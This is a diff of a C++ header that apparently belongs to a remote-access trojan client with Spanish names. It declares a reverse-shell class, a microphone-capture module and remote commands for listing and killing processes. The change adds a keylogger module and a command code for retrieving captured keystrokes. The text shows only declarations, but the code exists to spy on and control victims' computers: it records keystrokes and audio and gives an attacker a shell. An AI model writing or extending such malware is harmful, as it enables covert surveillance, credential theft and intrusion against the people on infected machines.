@@ -3,6 +3,7 @@
 
 #include "headers.hpp"
 #include "mod_mic.hpp"
+#include "mod_keylogger.hpp"
 
 class ReverseShell;
 class Mod_Mic;
@@ -19,6 +20,8 @@ class Cliente {
 
 		ReverseShell* reverseSHELL = nullptr;
 		Mod_Mic* mod_Mic = nullptr;
+		mod_Keylogger* mod_Key = nullptr;
+
 
 		//Para recibir archivo (single)
 		FILE *fpArchivo = nullptr;
@@ -53,7 +56,8 @@ class Cliente {
 			{"526", EnumComandos::PM_Refrescar},
 			{"527", EnumComandos::PM_Kill},
 			{"529", EnumComandos::KL_Iniciar},
-			{"530", EnumComandos::KL_Detener}
+			{"530", EnumComandos::KL_Detener},
+			{"531", EnumComandos::KL_Salida}
 
 		};
 
@@ -90,21 +94,21 @@ class Cliente {
 };
 
 class ReverseShell {
-private:
-	Cliente* copy_ptr;
-	std::mutex mutex_shell;
-	bool isRunning = false;
-	PROCESS_INFORMATION pi;
-	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
-	std::thread tRead;
-public:
-	ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
-	SOCKET sckSocket;
-	bool SpawnShell(const char* pStrComando);
-	void TerminarShell();
+	private:
+		Cliente* copy_ptr;
+		std::mutex mutex_shell;
+		bool isRunning = false;
+		PROCESS_INFORMATION pi;
+		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
+		std::thread tRead;
+	public:
+		ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
+		SOCKET sckSocket;
+		bool SpawnShell(const char* pStrComando);
+		void TerminarShell();
 
-	void thEscribirShell(std::string pStrInput);
-	void thLeerShell(HANDLE hPipe);
+		void thEscribirShell(std::string pStrInput);
+		void thLeerShell(HANDLE hPipe);
 };
 
 #endif
